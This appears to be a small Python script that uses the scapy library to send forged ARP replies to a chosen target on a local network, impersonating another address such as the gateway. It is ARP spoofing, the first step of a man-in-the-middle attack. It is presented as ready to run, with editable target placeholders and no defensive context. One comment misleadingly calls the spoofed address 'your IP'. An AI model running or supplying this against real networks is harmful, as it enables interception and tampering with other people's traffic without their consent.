import scapy.all as scapy

def spoof(target_ip, host_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=host_ip)
    scapy.send(packet, verbose=False)
    print(f"Spoofed {target_ip} to {host_ip}")

if __name__ == "__main__":
    target_ip = "192.168.1.5"  # Change to the target's IP
    host_ip = "192.168.1.1"     # Change to your IP
    spoof(target_ip, host_ip)